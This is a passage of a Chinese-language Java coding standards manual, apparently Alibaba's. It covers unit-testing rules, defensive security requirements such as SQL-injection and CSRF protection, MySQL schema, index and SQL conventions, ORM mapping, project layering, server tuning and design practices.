【强制】单元测试应该是全自动执行的，并且非交互式的。测试用例通常是被定期执行的，执行过程必须完全自动化才有意义。输出结果需要人工检查的测试不是一个好的单元测试。单元 测试中不准使用 System.out 来进行人肉验证，必须使用 assert 来验证。


【强制】保持单元测试的独立性。为了保证单元测试稳定可靠且便于维护，单元测试用例之间决不能互相调用，也不能依赖执行的先后次序。
反例：method2 需要依赖 method1 的执行，将执行结果作为 method2 的输入。


【强制】单元测试是可以重复执行的，不能受到外界环境的影响。
说明：单元测试通常会被放到持续集成中，每次有代码 check in 时单元测试都会被执行。如果单测对外部环境（网络、服务、中间件等）有依赖，容易导致持续集成机制的不可用。
正例：为了不受外界环境影响，要求设计代码时就把 SUT 的依赖改成注入，在测试时用 spring  这样的 DI 框架注入一个本地（内存）实现或者 Mock 实现。


【强制】对于单元测试，要保证测试粒度足够小，有助于精确定位问题。单测粒度至多是类级别，一般是方法级别。
说明：只有测试粒度小才能在出错时尽快定位到出错位置。单测不负责检查跨类或者跨系统的交互逻辑， 那是集成测试的领域。


【强制】核心业务、核心应用、核心模块的增量代码确保单元测试通过。
说明：新增代码及时补充单元测试，如果新增代码影响了原有单元测试，请及时修正。


【强制】单元测试代码必须写在如下工程目录：src/test/java，不允许写在业务代码目录下。
说明：源码编译时会跳过此目录，而单元测试框架默认是扫描此目录。


【推荐】单元测试的基本目标：语句覆盖率达到 70%；核心模块的语句覆盖率和分支覆盖率都要达到 100%
说明：在工程规约的应用分层中提到的 DAO 层，Manager层，可重用度高的 Service，都应该进行单元测 试。


【推荐】编写单元测试代码遵守 BCDE原则，以保证被测试模块的交付质量。

B：Border，边界值测试，包括循环边界、特殊取值、特殊时间点、数据顺序等。
C：Correct，正确的输入，并得到预期的结果。
D：Design，与设计文档相结合，来编写单元测试。
E：Error，强制错误信息输入（如：非法数据、异常流程、业务允许外等），并得到预期的结果。



【推荐】对于数据库相关的查询，更新，删除等操作，不能假设数据库里的数据是存在的，或者直接操作数据库把数据插入进去，请使用程序插入或者导入数据的方式来准备数据。
反例：删除某一行数据的单元测试，在数据库中，先直接手动增加一行作为删除目标，但是这一行新增数 据并不符合业务插入规则，导致测试结果异常。


【推荐】和数据库相关的单元测试，可以设定自动回滚机制，不给数据库造成脏数据。或者对单元测试产生的数据有明确的前后缀标识。
正例：在阿里巴巴企业智能事业部的内部单元测试中，使用 ENTERPRISE_INTELLIGENCE _UNIT_TEST_ 的前缀来标识单元测试相关代码。


【推荐】对于不可测的代码在适当的时机做必要的重构，使代码变得可测，避免为了达到测试要求而书写不规范测试代码。


【推荐】在设计评审阶段，开发人员需要和测试人员一起确定单元测试范围，单元测试最好覆盖所有测试用例（UC）。


【推荐】单元测试作为一种质量保障手段，在项目提测前完成单元测试，不建议项目发布后补充单元测试用例。


【参考】为了更方便地进行单元测试，业务代码应避免以下情况：


构造方法中做的事情过多。


存在过多的全局变量和静态方法。


存在过多的外部依赖。


存在过多的条件语句。


说明：多层条件语句建议使用卫语句、策略模式、状态模式等方式重构。


【参考】不要对单元测试存在如下误解：


那是测试同学干的事情。本文是开发手册，凡是本文内容都是与开发同学强相关的。


单元测试代码是多余的。系统的整体功能与各单元部件的测试正常与否是强相关的。


单元测试代码不需要维护。一年半载后，那么单元测试几乎处于废弃状态。


单元测试与线上故障没有辩证关系。好的单元测试能够最大限度地规避线上故障。




四、安全规约


【强制】隶属于用户个人的页面或者功能必须进行权限控制校验。
说明：防止没有做水平权限校验就可随意访问、修改、删除别人的数据，比如查看他人的私信内容。


【强制】用户敏感数据禁止直接展示，必须对展示数据进行脱敏。
说明：中国大陆个人手机号码显示：139****1219，隐藏中间 4 位，防止隐私泄露。


【强制】用户输入的 SQL 参数严格使用参数绑定或者 METADATA字段值限定，防止 SQL 注入， 禁止字符串拼接 SQL 访问数据库。
反例：某系统签名大量被恶意修改，即是因为对于危险字符  # --没有进行转义，导致数据库更新时，where 后边的信息被注释掉，对全库进行更新。


【强制】用户请求传入的任何参数必须做有效性验证。
说明：忽略参数校验可能导致：


page size 过大导致内存溢出


恶意 order by 导致数据库慢查询


缓存击穿


SSRF


任意重定向


SQL 注入，Shell 注入，反序列化注入


正则输入源串拒绝服务 ReDoS


Java 代码用正则来验证客户端的输入，有些正则写法验证普通用户输入没有问题，但是如果攻击人员使用 的是特殊构造的字符串来验证，有可能导致死循环的结果。


【强制】禁止向 HTML 页面输出未经安全过滤或未正确转义的用户数据。


【强制】表单、AJAX提交必须执行 CSRF 安全验证。
说明：CSRF(Cross-site request forgery)跨站请求伪造是一类常见编程漏洞。对于存在 CSRF 漏洞的应用/ 网站，攻击者可以事先构造好 URL，只要受害者用户一访问，后台便在用户不知情的情况下对数据库中用户参数进行相应修改。


【强制】URL外部重定向传入的目标地址必须执行白名单过滤。


【强制】在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放的机制，如数量限制、疲劳度控制、验证码校验，避免被滥刷而导致资损。
说明：如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能骚扰到其它用户，并造成短信平台资源浪费。


【推荐】发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过滤等风控策略。


五、MySQL 数据库
(一)  建表规约


【强制】表达是与否概念的字段，必须使用 is_xxx 的方式命名，数据类型是 unsigned tinyint （1 表示是，0 表示否）。
说明：任何字段如果为非负数，必须是 unsigned。
注意：POJO 类中的任何布尔类型的变量，都不要加 is 前缀，所以，需要在设置从 is_xxx 到 Xxx的映射关系。数据库表示是与否的值，使用 tinyint 类型，坚持 is_xxx 的命名方式是为了明确其取值含 义与取值范围。
正例：表达逻辑删除的字段名 is_deleted，1 表示删除，0 表示未删除。


【强制】表名、字段名必须使用小写字母或数字，禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。
说明：MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。因此，数据库名、表名、 字段名，都不允许出现任何大写字母，避免节外生枝。
正例：aliyun_admin，rdc_config，level3_name
反例：AliyunAdmin，rdcConfig，level_3_name


【强制】表名不使用复数名词。
说明：表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 DO 类名也是单数形式，符合表达习惯。


【强制】禁用保留字，如 desc、range、match、delayed 等，请参考 MySQL 官方保留字。


【强制】主键索引名为 pk_字段名；唯一索引名为 uk_字段名；普通索引名则为 idx_字段名。
说明：pk_  即 primary key；uk_  即 unique key；idx_  即 index 的简称。


【强制】小数类型为 decimal，禁止使用 float 和 double。
说明：在存储的时候，float  和 double  都存在精度损失的问题，很可能在比较值的时候，得到不正确的结果。如果存储的数据范围超过 decimal  的范围，建议将数据拆成整数和小数并分开存储。


【强制】如果存储的字符串长度几乎相等，使用 char 定长字符串类型。


【强制】varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度 大于此值，定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效 率。


【强制】表必备三字段：id, create_time, update_time。
说明：其中 id 必为主键，类型为 bigint unsigned、单表时自增、步长为 1。create_time, update_time 的类型均为 datetime 类型，前者现在时表示主动式创建，后者过去分词表示被动式更新。


【推荐】表的命名最好是遵循“业务名称_表的作用”。
正例：alipay_task / force_project / trade_config


【推荐】库名与应用名称尽量一致。


【推荐】如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。


【推荐】字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循：


不是频繁修改的字段。


不是唯一索引的字段。


不是 varchar 超长字段，更不能是 text 字段。


正例：各业务线经常冗余存储商品名称，避免查询时需要调用 IC 服务获取。


【推荐】单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。
说明：如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。


【参考】合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索 速度。
正例：无符号值可以避免误存负数，且扩大了表示范围。



对象
年龄区间
类型
字节
表示范围




人
150 岁之内
tinyint unsigned
1
无符号值：0 到 255


龟
数百岁
smallint unsigned
2
无符号值：0 到 65535


恐龙化石
数千万年
int unsigned
4
无符号值：0 到约 43 亿


太阳
约 50 亿年
bigint unsigned
8
无符号值：0 到约 10 的 19 次方





(二)  索引规约


【强制】业务上具有唯一特性的字段，即使是组合字段，也必须建成唯一索引。
说明：不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的；另外， 即使在应用层做了非常完善的校验控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。


【强制】超过三个表禁止 join。==需要 join 的字段，数据类型保持绝对一致==；多表关联查询时， 保证被关联的字段需要有索引。
说明：即使双表 join 也要注意表索引、SQL 性能。


【强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据 实际文本区分度决定索引长度。
说明：索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90% 以上，可以使用count(distinct left(列名,  索引长度))/count(\*)的区分度来确定。


【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。
说明：索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。


【推荐】如果有order by的场景，请注意利用索引的有序性。order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现file_sort的情况，影响查询性能。
正例：where a=? and b=? order by c;  索引：a_b_c
反例：索引如果存在范围查询，那么索引有序性无法利用，如： WHERE a&gt;10 ORDER BY b; 索引a_b无法排序。


【推荐】利用覆盖索引来进行查询操作，避免回表。
说明：如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这 个目录就是起到覆盖索引的作用。
正例：能够建立索引的种类分为主键索引、唯一索引、普通索引三种，而覆盖索引只是一种查询的一种效 果，用 explain 的结果，extra 列会出现：using index。


【推荐】利用延迟关联或者子查询优化超多分页场景。
说明：MySQL 并不是跳过 offset 行，而是取 offset+N 行，然后返回放弃前 offset 行，返回 N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。
正例：先快速定位需要获取的 id 段，然后再关联：
SELECT t1.* FROM  表 1 as t1, (select id from  表 1 where  条件  LIMIT 100000,20 ) as t2 where t1.id=t2.id


【推荐】SQL 性能优化的目标：至少要达到 range  级别，要求是 ref 级别，如果可以是 consts 最好。
说明：


consts  单表中最多只有一个匹配行（主键或者唯一索引），在优化阶段即可读取到数据。


ref  指的是使用普通的索引（normal index）。


range  对索引进行范围检索。


反例：explain 表的结果，type=index，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。


【推荐】建组合索引的时候，区分度最高的在最左边。
正例：如果 where a=? and b=?，a 列的几乎接近于唯一值，那么只需要单建 idx_a 索引即可。
说明：存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如：where c&gt;? and d=? 那么即使 c 的区分度更高，也必须把 d 放在索引的最前列，即建立组合索引 idx_d_c。


【推荐】防止因字段类型不同造成的隐式转换，导致索引失效。


【参考】创建索引时避免有如下极端误解：


索引宁滥勿缺。认为一个查询就需要建一个索引。


吝啬索引的创建。认为索引会消耗空间、严重拖慢记录的更新以及行的新增速度。


抵制惟一索引。认为惟一索引一律需要在应用层通过“先查后插”方式解决。




(三)  SQL 语句


【强制】不要使用 count(列名)或 count(常量)来替代 count(*)，count(*)是 SQL92 定义的标 准统计行数的语法，跟数据库无关，跟 NULL和非 NULL无关。
说明：==count(*)会统计值为 NULL的行，而 count(列名)不会统计此列为 NULL值的行==


【强制】count(distinct col)  计算该列除 NULL之外的不重复行数，注意  count(distinct col1, col2)  如果其中一列全为 NULL，那么即使另一列有不同的值，也返回为 0。


【强制】当某一列的值全是 NULL时，count(col)的返回结果为 0，但 sum(col)的返回结果为 NULL，因此使用 sum()时需注意 NPE 问题。
正例：可以使用如下方式来避免 sum 的 NPE 问题：SELECT IFNULL(SUM(column), 0) FROM table;


【强制】使用 ISNULL()来判断是否为 NULL值。
说明：==NULL与任何值的直接比较都为 NULL==。
1）  NULL&lt;&gt;NULL 的返回结果是 NULL，而不是 false。
2）  NULL=NULL 的返回结果是 NULL，而不是 true。
3）  NULL&lt;&gt;1 的返回结果是 NULL，而不是 true。
反例：在 SQL 语句中，如果在 null 前换行，影响可读性。select * from table where column1 is null and column3 is not null;  而 ISNULL(column) 是一个整体，简洁易懂。从性能数据上分析， ISNULL(column) 执行效率更快一些。


【强制】代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。


【强制】不得使用外键与级联，一切外键概念必须在应用层解决。
说明：（概念解释）学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，即为级联更新。
外键与级联更新适用于单机 低并发，不适合分布式、高并发集群；
级联更新是强阻塞，存在数据库更新风暴的风险；
外键影响数据库的插入速度。


【强制】禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。


【强制】数据订正（特别是删除或修改记录操作）时，要先 select，避免出现误删除，确认无 误才能执行更新语句。


【强制】对于数据库中表记录的查询和变更，只要涉及多个表，都需要在列名前加表的别名（或表名）进行限定。
说明：对多表进行查询记录、更新记录、删除记录时，如果对操作列没有限定表的别名（或表名），并且操作列在多个表中存在时，就会抛异常。
正例：select t1.name from table_first as t1 , table_second as t2 where t1.id=t2.id;
反例：在某业务中，由于多表关联查询语句没有加表的别名（或表名）的限制，正常运行两年后，最近在 某个表中增加一个同名字段，在预发布环境做数据库变更后，线上查询语句出现出 1052 异常：Column ‘name’ in field list is ambiguous。


【推荐】SQL 语句中表的别名前加 as，并且以 t1、t2、t3、…的顺序依次命名。
说明：
1）别名可以是表的简称，或者是依照表在 SQL 语句中出现的顺序，以 t1、t2、t3 的方式命名。
2） 别名前加 as 使别名更容易识别。
正例：select t1.name from table_first as t1, table_second as t2 where t1.id=t2.id;


【推荐】in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。


【参考】因国际化需要，所有的字符存储与表示，均采用 utf8 字符集，那么字符计数方法需 要注意。
说明：
SELECT LENGTH("轻松工作");  返回为 12 SELECT CHARACTER_LENGTH("轻松工作"); 返回为 4 
如果需要存储表情，那么选择 utf8mb4 来进行存储，注意它与 utf8 编码的区别。


【参考】TRUNCATE TABLE  比  DELETE  速度快，且使用的系统和事务日志资源少，但 TRUNCATE 无事务且不触发 trigger，有可能造成事故，故不建议在开发代码中使用此语句。
说明：TRUNCATE TABLE 在功能上与不带  WHERE  子句的  DELETE 语句相同。


(四)  ORM 映射


【强制】在表查询中，一律不要使用  * 作为查询的字段列表，需要哪些字段必须明确写明。
说明：
1）增加查询分析器解析成本。
2）增减字段容易与 resultMap 配置不一致。
3）无用字段增加网络 消耗，尤其是 text 类型的字段。


【强制】POJO 类的布尔属性不能加 is，而数据库字段必须加 is_，要求在 resultMap 中进行字段与属性之间的映射。
说明：参见定义 POJO 类以及数据库字段定义规定，在 sql.xml 增加映射，是必须的。


【强制】不要用 resultClass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要 定义；反过来，每一个表也必然有一个与之对应。
说明：配置映射关系，使字段与 DO 类解耦，方便维护。


【强制】sql.xml 配置参数使用：#{}，#param#  不要使用${} 此种方式容易出现 SQL 注入。


【强制】iBATIS自带的 queryForList(String statementName,int start,int size)不推荐使用。
说明：其实现方式是在数据库取到 statementName 对应的 SQL 语句的所有记录，再通过 subList 取 start,size 的子集合。
正例：
Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(16); map.put("start", start); map.put("size", size); 


【强制】不允许直接拿 HashMap 与 Hashtable 作为查询结果集的输出。
反例：某同学为避免写一个xxx，直接使用 HashTable 来接收数据库返回结果，结果出现日常是把 bigint 转成 Long 值，而线上由于数据库版本不一样，解析成 BigInteger，导致线上问题。


【强制】更新数据表记录时，必须同时更新记录对应的 update_time 字段值为当前时间。


【推荐】不要写一个大而全的数据更新接口。传入为 POJO 类，不管是不是自己的目标更新字 段，都进行 update table set c1=value1,c2=value2,c3=value3;  这是不对的。执行 SQL 时， 不要更新无改动的字段，一是易出错；二是效率低；三是增加 binlog 存储。


【参考】@Transactional 事务不要滥用。事务会影响数据库的 QPS，另外使用事务的地方需 要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。


【参考】&lt;isEqual&gt;中的 compareValue 是与属性值对比的常量，一般是数字，表示相等时带上此条件；&lt;isNotEmpty&gt;表示不为空且不为 null 时执行；&lt;isNotNull&gt;表示不为 null 值 时执行。


六、工程结构
(一)  应用分层


【推荐】根据业务架构实践，结合业界分层规范与流行技术框架分析，推荐分层结构如图所示， 默认上层依赖于下层，箭头关系表示可直接依赖，如：开放 API 层可以依赖于 Web 层 （Controller 层），也可以直接依赖于 Service 层，依此类推



开放 API 层：可直接封装 Service 接口暴露成 RPC 接口；通过 Web 封装成 http 接口；网关控制层等。


终端显示层：各个端的模板渲染并执行显示的层。当前主要是 velocity 渲染，JS 渲染，JSP 渲染，移 动端展示等。


Web 层：主要是对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理等。


Service 层：相对具体的业务逻辑服务层。


Manager 层：通用业务处理层，它有如下特征：
1） 对第三方平台封装的层，预处理返回结果及转化异常信息，适配上层接口。
2） 对 Service 层通用能力的下沉，如缓存方案、中间件通用处理。
3） 与 DAO 层交互，对多个 DAO 的组合复用。


DAO 层：数据访问层，与底层 MySQL、Oracle、Hbase、OB 等进行数据交互。


第三方服务：包括其它部门 RPC 服务接口，基础平台，其它公司的 HTTP 接口，如淘宝开放平台、支 付宝付款服务、高德地图服务等。


外部数据接口：外部（应用）数据存储服务提供的接口，多见于数据迁移场景中。




【参考】（分层异常处理规约）在 DAO 层，产生的异常类型有很多，无法用细粒度的异常进行 catch，使用 ==catch(Exception e)方式，并 throw new DAOException(e)==，不需要打印日志，因 为日志在 Manager/Service 层一定需要捕获并打印到日志文件中去，如果同台服务器再打日志，浪费性能和存储。在 Service 层出现异常时，必须记录出错日志到磁盘，尽可能带上参数信息， 相当于保护案发现场。Manager 层与 Service 同机部署，日志方式与 DAO 层处理一致，如果是 单独部署，则采用与 Service 一致的处理方式。Web 层绝不应该继续往上抛异常，因为已经处于顶层，如果意识到这个异常将导致页面无法正常渲染，那么就应该直接跳转到友好错误页面， 尽量加上友好的错误提示信息。开放接口层要将异常处理成错误码和错误信息方式返回。


【参考】分层领域模型规约：


DO（Data Object）：此对象与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。


DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。


BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。


Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类 来传输。


VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。




(二)  二方库依赖


【强制】定义 GAV遵从以下规则：


GroupID 格式：com.{公司/BU }.业务线  [.子业务线]，最多 4 级。
说明：{公司/BU}  例如：alibaba/taobao/tmall/aliexpress 等 BU 一级；子业务线可选。
正例：com.taobao.jstorm  或 com.alibaba.dubbo.register


ArtifactID 格式：产品线名-模块名。语义不重复不遗漏，先到中央仓库去查证一下。
正例：dubbo-client / fastjson-api / jstorm-tool


Version：详细规定参考下方。




【强制】二方库版本号命名方式：主版本号.次版本号.修订号
1）主版本号：产品方向改变，或者大规模 API 不兼容，或者架构不兼容升级。
2） 次版本号：保持相对兼容性，增加主要功能特性，影响范围极小的 API 不兼容修改。
3） 修订号：保持完全兼容性，修复 BUG、新增次要功能特性等。
说明：注意起始版本号必须为：1.0.0，而不是 0.0.1。
反例：仓库内某二方库版本号从 1.0.0.0 开始，一直默默“升级”成 1.0.0.64，完全失去版本的语义信息。


【强制】线上应用不要依赖 SNAPSHOT 版本（安全包除外）；正式发布的类库必须先去中央仓 库进行查证，使 RELEASE版本号有延续性，且版本号不允许覆盖升级。
说明：不依赖 SNAPSHOT 版本是保证应用发布的幂等性。另外，也可以加快编译时的打包构建。


【强制】二方库的新增或升级，保持除功能点之外的其它 jar 包仲裁结果不变。如果有改变， 必须明确评估和验证。
说明：在升级时，进行 dependency:resolve 前后信息比对，如果仲裁结果完全不一致，那么通过 dependency:tree 命令，找出差异点，进行&lt;exclude&gt;排除 jar 包。


【强制】二方库里可以定义枚举类型，参数可以使用枚举类型，但是接口返回值不允许使用枚举类型或者包含枚举类型的 POJO 对象。


【强制】依赖于一个二方库群时，必须定义一个统一的版本变量，避免版本号不一致。
说明：依赖 springframework-core,-context,-beans，它们都是同一个版本，可以定义一个变量来保存版本：${spring.version}，定义依赖的时候，引用该版本。


【强制】禁止在子项目的 pom 依赖中出现相同的 GroupId，相同的 ArtifactId，但是不同的 Version。
说明：在本地调试时会使用各子项目指定的版本号，但是合并成一个 war，只能有一个版本号出现在最后的 lib 目录中。曾经出现过线下调试是正确的，发布到线上却出故障的先例。


【推荐】底层基础技术框架、核心数据管理平台、或近硬件端系统谨慎引入第三方实现。


【推荐】所有 pom 文件中的依赖声明放在&lt;dependencies&gt;语句块中，所有版本仲裁放在&lt;dependencyManagement&gt;语句块中。
说明：&lt;dependencyManagement&gt;里只是声明版本，并不实现引入，因此子项目需要显式的声明依赖， version 和 scope 都读取自父 pom。而&lt;dependencies&gt;所有声明在主 pom 的&lt;dependencies&gt;的依赖都会自动引入，并默认被所有的子项目继承。


【推荐】二方库不要有配置项，最低限度不要再增加配置项。


【推荐】不要使用不稳定的工具包或者 Utils 类。
说明：不稳定指的是提供方无法做到向下兼容，在编译阶段正常，但在运行时产生异常，因此，尽量使用 业界稳定的二方工具包。


【参考】为避免应用二方库的依赖冲突问题，二方库发布者应当遵循以下原则：
1）精简可控原则。移除一切不必要的 API 和依赖，只包含  Service API、必要的领域模型对象、Utils 类、 常量、枚举等。如果依赖其它二方库，尽量是 provided 引入，让二方库使用者去依赖具体版本号；无 log 具体实现，只依赖日志框架。2）稳定可追溯原则。每个版本的变化应该被记录，二方库由谁维护，源码在哪里，都需要能方便查到。除非用户主动升级版本，否则公共二方库的行为不应该发生变化。


(三)  服务器


【推荐】高并发服务器建议调小TCP 协议的 time_wait 超时时间。
说明：操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接，在高并发访问下，服务器端会因为 处于 time_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上调小此等待值。
正例：在 linux 服务器上请通过变更/etc/sysctl.conf 文件去修改该缺省值（秒）：  net.ipv4.tcp\_fin\_timeout = 30


【推荐】调大服务器所支持的最大文件句柄数（File Descriptor，简写为 fd）。
说明：主流操作系统的设计是将 TCP/UDP 连接采用与文件一样的方式去管理，即一个连接对应于一个 fd。 主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易因为 fd 不足而出现“open too many files”错误，导致新的连接无法建立。建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）。


【推荐】给 JVM环境参数设置-XX:+HeapDumpOnOutOfMemoryError参数，让 JVM碰到 OOM 场景时输出 dump 信息。
说明：OOM 的发生是有概率的，甚至相隔数月才出现一例，出错时的堆内信息对解决问题非常有帮助。


【推荐】在线上生产环境，JVM 的 Xms 和 Xmx 设置一样大小的内存容量，避免在 GC  后调整堆大小带来的压力。


【参考】服务器内部重定向必须使用 forward；外部重定向地址必须使用 URL Broker 生成，否 则因线上采用 HTTPS 协议而导致浏览器提示“不安全“。此外，还会带来 URL维护不一致的 问题。


七、设计规约


【强制】存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。
说明：有缺陷的底层数据结构容易导致系统风险上升，可扩展性下降，重构成本也会因历史数据迁移和系 统平滑过渡而陡然增加，所以，存储方案和数据结构需要认真地进行设计和评审，生产环境提交执行后， 需要进行 double check。
正例：评审内容包括存储介质选型、表结构设计能否满足技术方案、存取性能和存储空间能否满足业务发 展、表或字段之间的辩证关系、字段名称、字段类型、索引等；数据结构变更（如在原有表中新增字段） 也需要进行评审通过后上线。


【强制】在需求分析阶段，如果与系统交互的 User 超过一类并且相关的 User Case 超过 5 个， 使用用例图来表达更加清晰的结构化需求。


【强制】如果某个业务对象的状态超过 3 个，使用状态图来表达并且明确状态变化的各个触发 条件。
说明：状态图的核心是对象状态，首先明确对象有多少种状态，然后明确两两状态之间是否存在直接转换 关系，再明确触发状态转换的条件是什么。
正例：淘宝订单状态有已下单、待付款、已付款、待发货、已发货、已收货等。比如已下单与已收货这两 种状态之间是不可能有直接转换关系的。


【强制】如果系统中某个功能的调用链路上的涉及对象超过 3 个，使用时序图来表达并且明确 各调用环节的输入与输出。    说明：时序图反映了一系列对象间的交互与协作关系，清晰立体地反映系统的调用纵深链路。


【强制】如果系统中模型类超过 5 个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。
说明：类图像建筑领域的施工图，如果搭平房，可能不需要，但如果建造空间大楼，肯定需要详细的施工图。


【强制】如果系统中超过 2 个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。
说明：活动图是流程图的扩展，增加了能够体现协作关系的对象泳道，支持表示并发等。


【推荐】系统架构设计时明确以下目标：


确定系统边界。确定系统在技术层面上的做与不做。


确定系统内模块之间的关系。确定模块之间的依赖关系及模块的宏观输入与输出。


确定指导后续设计与演化的原则。使后续的子系统或模块设计在一个既定的框架内和技术方向上继 续演化。


确定非功能性需求。非功能性需求是指安全性、可用性、可扩展性等。




【推荐】需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。
反例：用户在淘宝付款过程中，银行扣款成功，发送给用户扣款成功短信，但是支付宝入款时由于断网演 练产生异常，淘宝订单页面依然显示未付款，导致用户投诉。


【推荐】类在设计与实现时要符合单一原则。
说明：单一原则最易理解却是最难实现的一条规则，随着系统演进，很多时候，忘记了类设计的初衷。


【推荐】谨慎使用继承的方式来进行扩展，优先使用聚合/组合的方式来实现。
说明：不得已使用继承的话，必须符合里氏代换原则，此原则说父类能够出现的地方子类一定能够出现， 比如，“把钱交出来”，钱的子类美元、欧元、人民币等都可以出现。


【推荐】系统设计阶段，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。
说明：低层次模块依赖于高层次模块的抽象，方便系统间的解耦。


【推荐】系统设计阶段，注意对扩展开放，对修改闭合。
说明：极端情况下，交付的代码是不可修改的，同一业务域内的需求变化，通过模块或类的扩展来实现。


【推荐】系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方 法等，在系统中不出现重复代码的情况，即 DRY原则（Don’t Repeat Yourself）。
说明：随着代码的重复次数不断增加，维护成本指数级上升。随意复制和粘贴代码，必然会导致代码的重复， 在维护代码时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是组件化。
正例：一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取：
private boolean checkParam(DTO dto) {    ...} 


【推荐】避免如下误解：敏捷开发  =  讲故事  +  编码  +  发布。
说明：敏捷开发是快速交付迭代可用的系统，省略多余的设计方案，摒弃传统的审批流程，但核心关键点上 的必要设计和文档沉淀是需要的。
反例：某团队为了业务快速发展，敏捷成了产品经理催进度的借口，系统中均是勉强能运行但像面条一样 的代码，可维护性和可扩展性极差，一年之后，不得不进行大规模重构，得不偿失。


【参考】设计文档的作用是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。
说明：避免为了设计而设计，系统设计文档有助于后期的系统维护和重构，所以设计结果需要进行分类归 档保存。


【参考】可扩展性的本质是找到系统的变化点，并隔离变化点。
说明：世间众多设计模式其实就是一种设计模式即隔离变化点的模式。
正例：极致扩展性的标志，就是需求的新增，不会在原有代码交付物上进行任何形式的修改。


【参考】设计的本质就是识别和表达系统难点。
说明：识别和表达完全是两回事，很多人错误地认为识别到系统难点在哪里，表达只是自然而然的事情， 但是大家在设计评审中经常出现语焉不详，甚至是词不达意的情况。准确地表达系统难点需要具备如下能 力：  表达规则和表达工具的熟练性。抽象思维和总结能力的局限性。基础知识体系的完备性。深入浅出的 生动表达力。


【参考】代码即文档的观点是错误的，清晰的代码只是文档的某个片断，而不是全部。
说明：代码的深度调用，模块层面上的依赖关系网，业务场景逻辑，非功能性需求等问题是需要相应的文 档来完整地呈现的。


【参考】在做无障碍产品设计时，需要考虑到：


所有可交互的控件元素必须能被 tab 键聚焦，并且焦点顺序需符合自然操作逻辑。


用于登录校验和请求拦截的验证码均需提供图形验证以外的其它方式。


自定义的控件类型需明确交互方式。


正例：用户登录场景中，输入框的按钮都需要考虑 tab 键聚焦，符合自然逻辑的操作顺序如下，“输入用 户名，输入密码，输入验证码，点击登录”，其中验证码实现语音验证方式。如果有自定义标签实现的控 件设置控件类型可使用 role 属性。


附录
附录1：专有名词解释

POJO（Plain Ordinary Java Object）:  在本规约中，POJO 专指只有 setter/getter/toString 的 简单类，包括 DO/DTO/BO/VO 等。
DO（Data Object）：阿里巴巴专指数据库表一一对应的 POJO 类。此对象与数据库表结构一 一对应，通过 DAO 层向上传输数据源对象。
DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。
BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。
Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类来传输。
VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。
AO（Application Object）:  阿里巴巴专指 Application Object，即在 Service 层上，极为贴近 业务的复用代码。
CAS（Compare And Swap）：解决多线程并行情况下使用锁造成性能损耗的一种机制，这是 硬件实现的原子操作。CAS 操作包含三个操作数：内存位置、预期原值和新值。如果内存位 置的值与预期原值相匹配，那么处理器会自动将该位置值更新为新值。否则，处理器不做任何 操作。
